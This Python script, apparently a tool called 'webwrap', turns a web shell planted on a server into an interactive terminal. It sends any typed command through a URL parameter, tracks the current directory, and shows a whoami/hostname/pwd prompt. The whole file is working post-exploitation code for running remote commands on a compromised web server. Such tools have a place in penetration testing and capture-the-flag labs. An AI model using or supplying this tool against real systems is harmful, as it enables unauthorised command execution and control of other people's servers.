#!/usr/bin/python3
import httpx
import re
from termcolor import colored
import urllib.parse
import sys

if len(sys.argv) >= 2 and "WRAP" in sys.argv[1]:
	host = sys.argv[1]
else:
	print("\nPlease specify the url with WRAP where the command belongs.\nExample :\n$ webwrap http://localhost:8000/webshell.php?cmd=WRAP")
	exit()
	
try:
	#establish regex prompt boundaries
	reg = """\]PROMPTSTART\]([\s\S]*)\]PROMPTEND\]"""
	#getting initial user/host/pwd
	req = httpx.get(host.replace("WRAP", "echo -n ]PROMPTSTART]$(whoami)[$(hostname)[$(pwd)]PROMPTEND]"))
	#search for prefixes within regex prompt boundaries
	prefixes = re.compile(reg).findall(req.text)[0].split("[")
	path = prefixes[2]
	#establish prompt layout
	prefix = colored(prefixes[0] + "@" + prefixes[1], "red") + ":" + colored(prefixes[2], "cyan") + "$ "
	print("")

	while 1:
		#cd to current path and chain cmd with user/host/pwd to retain pwd location
		cmd = input(prefix)
		cmd = urllib.parse.quote("echo -n ']PROMPTSTART]' ; cd {} && ".format(path) + cmd + " 2>&1 ; echo $(whoami)[$(hostname)[$(pwd) ; echo ']PROMPTEND]'")
		req = httpx.get(host.replace("WRAP", cmd))
		try:
			#extract output within prompt boundaries
			output = re.compile(reg).findall(req.text)[0].split('\n')
			#extract prompt from the last 2 index positions and format
			prefixes = output.pop(len(output) - 2).split("[")
			#update current path
			path = prefixes[2]
			prefix = colored(prefixes[0] + "@" + prefixes[1], "red") + ":" + colored(prefixes[2], "cyan") + "$ "
			#print command output
			output = "\n".join(output)
			print(output)
		except IndexError:
			print("Error.\n")
except KeyboardInterrupt:
	print(colored("\nGoodbye !", "cyan"))
	exit()
